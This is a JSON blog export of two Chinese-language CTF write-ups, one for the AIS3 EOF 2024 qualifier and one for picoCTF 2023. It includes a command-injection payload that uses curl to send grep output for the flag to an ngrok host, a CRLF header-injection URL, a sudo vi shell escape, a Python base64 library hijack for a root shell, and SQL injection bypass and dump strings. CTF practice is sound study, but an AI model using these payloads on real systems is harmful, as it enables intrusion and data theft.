{"posts":[{"title":"2024 AIS3 EOF CTF Qual writeup","text":"webnslookup final AIS3{jUST_3a$y_cOMmaND_INj3c7I0N} 有command injection，用``把指令包起來，但是會有一個問題就是他不會回傳結果， 1curl webhook.trianglesnake.com/?text=123 呼叫聊天機器人webhook試試看，有收到訊息，所以直接把flag偷出來 因為有WAF限制flag、*，但我知道flag的prefix了，所以直接遍歷根目錄檔案找出flag 12`curl -G https://eec1-182-234-154-17.ngrok-free.app/ --data-urlencode &quot;$(find / -maxdepth 1 -type f -exec grep 'ais3' {} +)&quot;` internal AIS3{JUsT_s0m3_FUnNy_N91NX_FEaturE} 沒辦法碰到/flag但是如果由內網機器送redirect請求並包含X-Accel-Redirectheader就可以穿透。 這題在考crlf截斷，截斷之後可以header injection 1http://10.105.0.21:11580/?redir=https://www.google.com%0d%0aX-Accel-Redirect:%20/flag copypasta題目有sql injection，用sqlmap dump出所有column後可以直接存取/posts/flag_id，但他會檢查cookie，所以絲路變成：透過sql injection創建不存在的貼文-&gt;透過string format撈出app.secret_key-&gt;偽造cookie-&gt;存取flag頁面 透過sql injection創造貼文1234#source codetmpl = db().cursor().execute( f&quot;SELECT * FROM copypasta_template WHERE id = {id}&quot; ).fetchone() 這裡很明顯留了一個洞給我們 12#payload?id=1,'a','{field.__class__....}' 此時下面進行format string的時候就會被injection 1res = content.format(field=request.form) 這題沒有做出來，卡在Pyton format string漏洞，可以摸到magic method，但是因為在不同namespace沒辦法用__global__撈到app.secret_key reversestateful AIS3{Ar3_y0U_@_sTAtEfuL_Or_S7AT3L3SS_ctfer} 把整個流程反過來做一次 真reversed engineering先用ghidra把C弄出來後用vs code 的取代把每個function改成printf，之後用python把出來的function整個反過來 1234567891011121314151617string = &quot;&quot;&quot;3618225054(k_target)2057902921(k_target)671274660(k_target)......557589375(k_target)3420754995(k_target)3648003850(k_target)1978986903(k_target)&quot;&quot;&quot;lst = string.split('\\n')lst.reverse()print(lst)for i in lst: print('state_'+i+';') 把每個狀態機的function+改成-，然後把k_target逆向回推 12345678910111213141516171819202122232425262728293031323334353637// Hello world! Cplayground is an online sandbox that makes it easy to try out// code.#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdbool.h&gt;int main() { int local_14 = 1; int local_10 = 0; unsigned local_c = 0xd7a9bb9e; bool bVar1 = false; char k_target[43] ={ 38, 75, ... 128, 101, -20, 125}; state_1978986903(k_target);state_3648003850(k_target);state_3420754995(k_target);state_557589375(k_target);...state_2057902921(k_target);state_3618225054(k_target); for (int i=0;i&lt;44;i++){ printf(&quot;%c&quot;,k_target[i]); } return 0;} 基本上就是反著做一遍","link":"/2024/02/06/2024-AIS3-EOF-CTF-Qual-writeup/"},{"title":"picoCTF 2023 writeup","text":"Binary ExploitationhijackingAUTHOR: THEONESTE BYAGUTANGAZA Description Getting root access can allow you to read the flag. Luckily there is a python file that you might like to play with. Through Social engineering, we've got the credentials to use on the server. SSH is running on the server. 隨便逛逛發現/challenge資料夾很可疑，但是沒辦法cd進去 查看sudo 發現使用者可以用sudo權限使用vi exploit123sudo vi:shell privilege escalation了，再來就直接A進去/challenge/把flag撈出來就好 picoCTF{pYth0nn_libraryH!j@CK!n9_5a7b5866} 原本解法這題當初在解的時候是在.server.py裡面import 的base64裡面搞鬼 只是不知道為甚麼在寫writeup的時候沒辦法用root權限執行.server.py 先ls -al發現有一個.server.py cat .server.py 1234567891011import base64import osimport socketip = 'picoctf.org'response = os.system(&quot;ping -c 1 &quot; + ip)#saving ping details to a variablehost_info = socket.gethostbyaddr(ip)#getting IP from a domainehost_info_to_str = str(host_info[2])host_info = base64.b64encode(host_info_to_str.encode('ascii'))print(&quot;Hello, this is a part of information gathering&quot;,'Host: ', host_info) vim .server.py沒辦法動.server.py，因為他是readonly，但是權限沒有設定到base64.py 在import file裡面加料vim /usr/lib/python3.8/base64.py 1234import oswhile 1: cmd=input() print(os.popen(cmd).read()) get shell 1sudo python3 .server.py ForensicshidemeAUTHOR: GEOFFREY NJOGU Description Every file gets a flag. The SOC analyst saw one image been sent back and forth between two people. They decided to investigate and found out that there was more than what meets the eye here. 下載下來發現是一張圖片看一看感覺很正常 用exiftool看了一下沒有把flag藏在某個欄位裡 strings flag.png看看發現裡面有長得很像路徑的東東 直接把flag.png當成zip解壓縮看看 1unzip flag.png 得到半張flag picoCTF{Hiddinng_An_imag3_within_@n_ima9e_92076717} FindAndOpenAUTHOR: MUBARAK MIKAIL Description Someone might have hidden the password in the trace file. Find the key to unlock this file. This tracefile might be good to analyze. 這題給了兩個檔案，第一個是flag.zip和dump.pcap。嘗試解壓縮flag.zip，發現需要密碼 先從dump.pcap下手看看用wireshark打開dump.pcap 隨便看幾個封包後發現都有明文 找到一個超可疑的封包，=結尾很可能是base64編碼的填充字元 decode後得到半截flag This is the secret: picoCTF{R34DING_LOKd_ 回到flag.zip，直接通靈把第一段flag當密碼 picoCTF{R34DING_LOKd_fil56_succ3ss_5ed3a878} ?? General Skillsmoney-wareAUTHOR: JUNI19 Description Flag format: picoCTF{Malwarename} The first letter of the malware name should be capitalized and the rest lowercase. Your friend just got hacked and has been asked to pay some bitcoins to 1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX. He doesn’t seem to understand what is going on and asks you for advice. Can you identify what malware he’s being a victim of? Google 1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX 找到CNBC的新聞 picoCTF{Petya} 水爛 repetitionsAUTHOR: THEONESTE BYAGUTANGAZA Description Can you make sense of this file? Download the file here. 下載enc_flag 12345VmpGU1EyRXlUWGxTYmxKVVYwZFNWbGxyV21GV1JteDBUbFpPYWxKdFVsaFpWVlUxWVZaS1ZWWnVhRmRXZWtab1dWWmtSMk5yTlZWWApiVVpUVm10d1VWZFdVa2RpYlZaWFZtNVdVZ3BpU0VKeldWUkNkMlZXVlhoWGJYQk9VbFJXU0ZkcVRuTldaM0JZVWpGS2VWWkdaSGRXCk1sWnpWV3hhVm1KRk5XOVVWVkpEVGxaYVdFMVhSbFZhTTBKWVZGWmFXbVZzV2tkWk0yaFRDbUpXV25sVVZtaFRWMGRHZEdWRlZsaGkKYlRrelZERldUMkpzUWxWTlJYTkxDZz09Cg== ==經典base64 decode後 1234VjFSQ2EyTXlSblJUV0dSVllrWmFWRmx0TlZOalJtUlhZVVU1YVZKVVZuaFdWekZoWVZkR2NrNVVXbUZTVmtwUVdWUkdibVZXVm5WUgpiSEJzWVRCd2VWVXhXbXBOUlRWSFdqTnNWZ3BYUjFKeVZGZHdWMlZzVWxaVmJFNW9UVVJDTlZaWE1XRlVaM0JYVFZaWmVsWkdZM2hTCmJWWnlUVmhTV0dGdGVFVlhibTkzVDFWT2JsQlVNRXNLCg== 再decode 123V1RCa2MyRnRTWGRVYkZaVFltNVNjRmRXYUU5aVJUVnhWVzFhYVdGck5UWmFSVkpQWVRGbmVWVnVRbHBsYTBweVUxWmpNRTVHWjNsVgpXR1JyVFdwV2VsUlZVbE5oTURCNVZXMWFUZ3BXTVZZelZGY3hSbVZyTVhSWGFteEVXbm93T1VOblBUMEsK de 12WTBkc2FtSXdUbFZTYm5ScFdWaE9iRTVxVW1aaWFrNTZaRVJPYTFneVVuQlpla0pyU1ZjME5GZ3lVWGRrTWpWelRVUlNhMDB5VW1aTgpWMVYzVFcxRmVrMXRXamxEWnowOUNnPT0K deeee 12Y0dsamIwTlVSbnRpWVhObE5qUmZiak56ZEROa1gyUnBZekJrSVc0NFgyUXdkMjVzTURSa00yUmZNV1V3TW1Fek1tWjlDZz09Cg== eeeeeeee 1cGljb0NURntiYXNlNjRfbjNzdDNkX2RpYzBkIW44X2Qwd25sMDRkM2RfMWUwMmEzMmZ9Cg== aaaaaaaaaa 1picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_1e02a32f} picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_1e02a32f} PermissionsAUTHOR: GEOFFREY NJOGU Description Can you read files in the root file? The system admin has provisioned an account for you on the main server: ssh -p 53849 picoplayer@saturn.picoctf.net Password: x+T6aPgE4- Can you login and read the root file? picoCTF{uS1ng_v1m_3dit0r_f6ad392b} 水爛 chronoAUTHOR: MUBARAK MIKAIL Description How to automate tasks to run at intervals on linux servers? Use ssh to connect to this server: Server: saturn.picoctf.net Port: 50602 Username: picoplayer Password: tPmsUpiHeZ picoCTF{Sch3DUL7NG_T45K3_L1NUX_0bb95b71} ? uselessAUTHOR: LOIC SHEMA Description There's an interesting script in the user's home directory Additional details will be available after launching your challenge instance. picoCTF{us3l3ss_ch4ll3ng3_3xpl0it3d_6173} SpecialAUTHOR: LT 'SYREAL' JONES Description Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM) Start your instance to see connection details. Additional details will be available after launching your challenge instance. 這題會一直把輸入的指令變成很簡單的單字，然後把開頭用成大寫ls會變Iscat會變Cat，但如果不是第一個字母就不會變大寫，所以可以用cat指令用; 搭配Regex Command Injection 1cat;cat * 發現目錄下面有一個資料夾blargh 1cat;cat blargh/* picoCTF{5p311ch3ck_15_7h3_w0r57_f578af59} Reverse EngineeringReverseAUTHOR: MUBARAK MIKAIL Description Try reversing this file? Can ya? I forgot the password to this file. Please find it for me? 題目給了一個檔案ret，執行後要輸密碼 丟GDB 1234start cctrl^Cni到死 在呼叫strcmp比對密碼時把rsi dump出來，得到前半截flag picoCTF{3lf_r3v3r5ing_succe55ful_9ae8528 重新執行ret，輸入密碼 picoCTF{3lf_r3v3r5ing_succe55ful_9ae85289} Web ExploitationMore SQLiAUTHOR: MUBARAK MIKAIL Description Can you find the flag on this website. Additional details will be available after launching your challenge instance. Bypass login進入網頁，經典登入介面 12username=admin&amp;password=' or 'a'='a 題目很貼心把query都print出來給你 調整一下 12username=123&amp;password=' or 1=1;-- 進入之後有一個搜尋頁面 測試有幾個欄位1searchInput=' union select 1,2,3;-- dump Table1searchInput=' or 'a'='a 沒看到flag，可能在別的table 1' union select group_concat(sql),2,3 from sqlite_master WHERE type='table';-- 現在知道flag應該在more_table的flag_TEXT欄位 1' union select flag,2,3 from more_table;-- picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37} MatchTheRegexAUTHOR: SUNDAY JACOB NWANYIM Description How about trying to match a regular expression Additional details will be available after launching your challenge instance. 一開始沒看hint不知道到底要幹嘛 結果是要match^p.....F!? picoCTF{succ3ssfully_matchtheregex_9080e406} 世紀水題 findmeAUTHOR: GEOFFREY NJOGU Description Help us test the form by submiting the username as test and password as test! Additional details will be available after launching your challenge instance. 先用test test!登入 進去後他說I was redirected here by a friend of mine but i couldnt find anything. Help me search for flags :-) 用BurpSuite查看被redirected的頁面id看起來很像經典base64 picoCTF{proxies_all_the_way_be716d8e}","link":"/2024/02/05/picoCTF-writeup/"}],"tags":[{"name":"writeup","slug":"writeup","link":"/tags/writeup/"}],"categories":[],"pages":[]}